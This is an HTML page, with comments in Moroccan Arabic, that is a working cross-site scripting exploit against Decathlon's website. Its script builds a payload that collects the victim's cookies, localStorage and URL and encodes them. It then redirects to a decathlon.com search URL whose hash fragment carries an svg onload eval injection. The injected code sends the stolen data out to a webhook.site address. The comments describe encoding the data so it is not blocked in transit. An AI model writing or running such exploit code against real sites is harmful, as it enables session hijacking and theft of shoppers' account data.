<!DOCTYPE html>
<html>
<body>
    <script>
        // الكود اللي غيتنفذ وسط Decathlon
        let payload = `
            (function(){
                // جمع الكوكيز والـ OSID والـ Shopify Data
                var d = {
                    c: document.cookie,
                    ls: JSON.stringify(localStorage),
                    h: window.location.href
                };
                // تشفير الداتا باش السيرفر ما يتبلوكاهاش فـ الطريق
                var secret = btoa(unescape(encodeURIComponent(JSON.stringify(d))));
                
                // الرابط ديال Webhook ديالك الجديد
                var web = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0"; 
                
                // الهروب الكبير: تحويل الصفحة بالكامل للـ Webhook مع الداتا
                document.location = web + "?data=" + secret;
            })();
        `;

        let encoded = encodeURIComponent(payload);

        // الرابط اللي غيستغل ثغرة الـ Hash
        let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";

        window.location.href = target;
    </script>
</body>
</html>
